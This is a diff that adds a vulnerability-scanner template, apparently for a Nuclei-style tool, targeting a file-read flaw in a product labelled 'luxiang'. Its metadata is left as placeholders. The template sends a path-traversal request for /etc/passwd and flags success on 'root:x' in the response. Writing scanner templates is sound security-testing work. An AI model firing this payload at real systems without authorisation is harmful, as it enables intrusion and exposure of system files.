@@ -1,0 +1,23 @@
+id: DT-luxiang-fileread
+info:
+  name: Template Name
+  author: apple
+  severity: high
+  description: description
+  reference:
+    - https://
+  tags: tags
+http:
+  - raw:
+      - |-
+        GET /../../../../etc/passwd HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
+        Accept-Encoding: gzip, deflate
+        Accept: */*
+        Connection: keep-alive
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'root:x'
